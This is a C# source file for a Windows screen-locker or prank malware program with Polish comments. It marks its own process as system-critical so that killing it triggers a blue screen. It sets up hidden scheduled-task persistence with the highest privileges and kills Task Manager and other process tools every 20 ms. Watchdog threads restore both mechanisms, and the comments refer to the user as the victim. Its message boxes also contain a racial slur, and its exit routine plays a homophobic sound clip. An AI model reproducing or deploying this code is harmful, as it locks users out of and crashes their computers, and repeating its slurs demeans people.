using System;
using System.Diagnostics;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace youCantLeavethis
{
    internal static class Program
    {
        /// <summary>
        /// Główny punkt wejścia dla aplikacji.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // Odtwarzaj Mazurka Dąbrowskiego w pętli — zasłużona oprawa muzyczna
            player = new SoundPlayer(Properties.Resources.Mazurek_Dąbrowskiego);
            player.PlayLooping();

            // Wejdź w tryb debugowania — wymagane do późniejszego oznaczenia procesu jako krytycznego
            Process.EnterDebugMode();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Upewnij się, że nie działa już druga instancja aplikacji
            check_if_running();

            // Wątek w tle — ciągle zabija Task Managera, Process Hackera itp.
            new Thread(loop_kill).Start();

            // Dodaj siebie do autostartu przez Task Scheduler
            startup();

            // Oznacz proces jako krytyczny — jego zabicie spowoduje BSOD
            make_process_critical();

            // Wątek w tle — pilnuje, żeby zadanie autostartu nie zostało usunięte
            new Thread(check_reg).Start();

            // Wątek w tle — pilnuje, żeby proces wciąż był oznaczony jako krytyczny
            new Thread(check_process_status).Start();

            Application.Run(new youCantLeavethis());
        }

        private static SoundPlayer player;


        // ── Importy WinAPI ────────────────────────────────────────────────────────

        /// <summary>
        /// Oznacza (lub odznacza) bieżący proces jako krytyczny systemowo.
        /// Zabicie krytycznego procesu powoduje natychmiastowy BSOD z kodem CRITICAL_PROCESS_DIED.
        /// </summary>
        /// <param name="bNew">True = ustaw jako krytyczny, False = cofnij.</param>
        /// <param name="pbOld">Poprzednie ustawienie.</param>
        /// <param name="bNeedScb">Czy wymagać, żeby system critical breaks był już włączony.</param>
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlSetProcessIsCritical(bool bNew, out bool pbOld, bool bNeedScb);

        /// <summary>
        /// Sprawdza, czy podany proces jest oznaczony jako krytyczny.
        /// </summary>
        /// <param name="hProcess">Uchwyt procesu (wymagany dostęp PROCESS_QUERY_LIMITED_INFORMATION).</param>
        /// <param name="IsCritical">Wynik — czy proces jest krytyczny.</param>
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsProcessCritical(IntPtr hProcess, out bool IsCritical);


        // ── Zarządzanie statusem krytycznym ──────────────────────────────────────

        /// <summary>
        /// Oznacza bieżący proces jako krytyczny systemowo.
        /// Od tej chwili jego zabicie = BSOD.
        /// </summary>
        public static void make_process_critical()
        {
            bool last_setting;
            RtlSetProcessIsCritical(true, out last_setting, false);
        }

        /// <summary>
        /// Cofa oznaczenie procesu jako krytycznego — wymagane przed bezpiecznym zamknięciem.
        /// </summary>
        public static void make_process_not_critical()
        {
            bool last_setting;
            RtlSetProcessIsCritical(false, out last_setting, false);
        }

        /// <summary>
        /// Zwraca true, jeśli bieżący proces jest aktualnie oznaczony jako krytyczny.
        /// </summary>
        public static bool check_if_critical_process()
        {
            Process process = Process.GetCurrentProcess();
            bool isCritical;
            IsProcessCritical(process.Handle, out isCritical);
            return isCritical;
        }


        // ── Autostart przez Task Scheduler ───────────────────────────────────────

        /// <summary>
        /// Rejestruje zadanie "CET" w Task Schedulerze — uruchamia aplikację przy każdym logowaniu
        /// z najwyższymi uprawnieniami, bez pytania o UAC (zakładając, że już mamy admina).
        /// </summary>
        public static void startup()
        {
            string taskName = "CET";
            string exePath = Application.ExecutablePath;

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/create /f /tn \"{taskName}\" /sc onlogon /rl highest /tr \"\\\"{exePath}\\\"\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(psi)?.WaitForExit();
        }

        /// <summary>
        /// Usuwa zadanie autostartu "CET" z Task Schedulera — używane tylko przy czystym wyjściu.
        /// </summary>
        public static void stop_startup()
        {
            string taskName = "CET";

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/delete /f /tn \"{taskName}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            Process.Start(psi)?.WaitForExit();
        }

        /// <summary>
        /// Sprawdza, czy zadanie "CET" istnieje w Task Schedulerze.
        /// schtasks zwraca kod 0 gdy zadanie istnieje, 1 gdy nie.
        /// </summary>
        private static bool task_exists()
        {
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = "/query /tn \"CET\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            Process p = Process.Start(psi);
            p.WaitForExit();
            return p.ExitCode == 0;
        }


        // ── Zabijanie narzędzi diagnostycznych ───────────────────────────────────

        /// <summary>
        /// Pętla działająca co 20ms — natychmiast zabija Task Managera, Process Hackera
        /// i inne narzędzia, którymi ofiara mogłaby próbować zakończyć proces.
        /// </summary>
        static private void loop_kill()
        {
            while (true)
            {
                string[] to_kill = { "ProcessHacker", "taskmgr", "tasklist", "taskkill" };

                foreach (string process in to_kill)
                {
                    foreach (Process proc in Process.GetProcessesByName(process))
                    {
                        proc.Kill();
                        MessageBox.Show($"{process} really?? i expected more from you.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    }
                }

                Thread.Sleep(20); // co 20ms sprawdzaj — wystarczająco szybko, żeby zdążyć przed ofiarą
            }
        }


        // ── Pilnowanie autostartu ─────────────────────────────────────────────────

        // Flaga zatrzymująca wątek check_reg przy czystym wyjściu
        private static volatile bool is_running_r = true;

        /// <summary>
        /// Wątek w tle — co 200ms sprawdza, czy zadanie autostartu nadal istnieje.
        /// Jeśli ofiara je usunęła, natychmiast je przywraca i wyświetla drwiący komunikat.
        /// </summary>
        static private void check_reg()
        {
            while (is_running_r)
            {
                if (!task_exists())
                {
                    startup();
                    MessageBox.Show("Alright this is a good try but not good enough :(", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }
                Thread.Sleep(200);
            }
        }

        /// <summary>
        /// Zatrzymuje wątek pilnujący autostartu — wywoływane tylko przy czystym wyjściu przez fix().
        /// </summary>
        static private void stop_checking_reg()
        {
            is_running_r = false;
        }


        // ── Pilnowanie statusu krytycznego ───────────────────────────────────────

        // Flaga zatrzymująca wątek check_process_status przy czystym wyjściu
        private static volatile bool is_running_p = true;

        /// <summary>
        /// Wątek w tle — co 200ms sprawdza, czy proces nadal jest oznaczony jako krytyczny.
        /// Jeśli ktoś zdołał to zmienić (np. przez debugger), oznacza go ponownie.
        /// </summary>
        static private void check_process_status()
        {
            while (is_running_p)
            {
                if (!check_if_critical_process())
                {
                    MessageBox.Show("Damn you're very very i mean VERY good but still i dont think you can beat me :P", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    make_process_critical();
                }
                Thread.Sleep(200);
            }
        }

        /// <summary>
        /// Zatrzymuje wątek pilnujący statusu krytycznego — wywoływane tylko przez fix().
        /// </summary>
        private static void stop_checking_proc()
        {
            is_running_p = false;
        }


        // ── Ochrona przed wielokrotnym uruchomieniem ──────────────────────────────

        /// <summary>
        /// Jeśli aplikacja jest już uruchomiona, wyświetla ostrzeżenie i zabija nową instancję.
        /// Zapobiega przypadkowemu podwójnemu uruchomieniu.
        /// </summary>
        private static void check_if_running()
        {
            int count = 0;

            foreach (Process process in Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName))
            {
                if (count == 1)
                {
                    MessageBox.Show("Nigga its already running", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    Process.GetCurrentProcess().Kill();
                }
                count++;
            }
        }


        // ── Czyste wyjście (sekretna furtka) ─────────────────────────────────────

        /// <summary>
        /// Jedyna legalna droga wyjścia z aplikacji.
        /// Kolejność operacji jest krytyczna — najpierw zatrzymaj wszystkie wątki strażnicze
        /// i cofnij status krytyczny, dopiero potem zabij proces. W przeciwnym razie = BSOD.
        ///
        /// Na deser: "Ha Gay" SFX jako nagroda za znalezienie tej metody.
        /// </summary>
        static public void fix()
        {
            // 1. Zatrzymaj wątki strażnicze, żeby nie przywróciły ustawień w trakcie sprzątania
            stop_checking_reg();
            stop_checking_proc();

            // 2. Usuń autostart
            stop_startup();

            // 3. Cofnij status krytyczny — MUSI być przed Kill(), inaczej BSOD
            make_process_not_critical();

            // 4. Nagrodź ofiarę stosownym efektem dźwiękowym
            player.Stop();
            player.Dispose();
            player = new SoundPlayer(Properties.Resources.Ha__Gay___QuickSounds_com);
            player.PlaySync();
            player.Dispose();

            // 5. Zakończ proces
            Process.GetCurrentProcess().Kill();
        }
    }
}